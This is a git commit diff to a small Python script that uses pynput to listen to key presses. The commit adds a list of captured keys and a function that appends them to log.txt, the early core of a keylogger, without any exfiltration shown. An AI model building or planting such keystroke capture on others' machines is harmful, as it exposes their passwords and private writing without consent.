78917adc476878b53447a5b210c7373376649356
Adam Wawrzyniak <adamwawrzyniak5@gmail.com>
2021-10-16 23:26:56 +0200

    Dodanie funkcji zapisu do pliku.

--- main.py
+++ main.py
@@ -1,9 +1,17 @@
 import pynput
 
 from pynput.keyboard import Key, Listener
+count = 0
+keys = []
 
 def press(key):
+    global keys, count
     print(f"{key} wciśniety")
+
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            f.write(key)
 
 def release(key):
     if key == Key.esc:
